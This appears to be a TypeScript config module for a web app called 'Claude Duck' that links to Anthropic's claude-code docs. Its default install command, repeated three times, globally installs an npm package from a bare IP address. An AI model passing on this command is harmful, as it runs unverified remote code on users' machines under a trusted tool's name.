// 服务端环境变量读取（用于API路由）
export const getServerAppName = (): string => {
  return process.env.APP_NAME || 'Claude Duck'
}

export const getServerApiUrl = (): string => {
  return process.env.API_URL || 'http://localhost:9998'
}

export const getServerInstallCommand = (): string => {
  return process.env.INSTALL_COMMAND || 'npm install -g http://111.180.197.234:7778/install --registry=https://registry.npmmirror.com'
}

export const getServerDocsUrl = (): string => {
  return process.env.DOCS_URL || 'https://github.com/anthropics/claude-code'
}

// 客户端配置获取（通过API）
let configCache: { appName: string; apiUrl: string; installCommand: string; docsUrl: string } | null = null

export const getConfig = async () => {
  if (configCache) return configCache
  
  try {
    const response = await fetch('/api/config')
    configCache = await response.json()
    return configCache
  } catch (error) {
    console.error('Failed to fetch config:', error)
    return {
      appName: 'Claude Duck',
      apiUrl: 'http://localhost:9998',
      installCommand: 'npm install -g http://111.180.197.234:7778/install --registry=https://registry.npmmirror.com',
      docsUrl: 'https://github.com/anthropics/claude-code'
    }
  }
}

// 同步版本（用于兼容现有代码）
export const getAppName = (): string => {
  return 'Claude Duck' // 默认值，会被 useEffect 中的异步加载覆盖
}

export const getApiUrl = (): string => {
  return 'http://localhost:9998' // 默认值，会被 useEffect 中的异步加载覆盖
}

export const getInstallCommand = (): string => {
  return 'npm install -g http://111.180.197.234:7778/install --registry=https://registry.npmmirror.com' // 默认值，会被 useEffect 中的异步加载覆盖
}

export const getDocsUrl = (): string => {
  return 'https://github.com/anthropics/claude-code' // 默认值，会被 useEffect 中的异步加载覆盖
}